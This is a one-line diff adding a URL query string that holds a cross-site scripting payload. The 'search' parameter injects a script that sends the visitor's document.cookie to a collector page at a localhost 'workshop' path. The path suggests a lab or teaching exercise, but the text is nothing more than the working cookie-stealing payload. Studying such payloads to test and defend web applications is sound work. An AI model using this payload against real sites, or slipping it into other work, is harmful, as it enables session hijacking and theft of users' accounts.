@@ -1,0 +1,1 @@
+?search=<script>document.location="http://localhost/workshop/collect.php/?c="%2Bdocument.cookie</script>
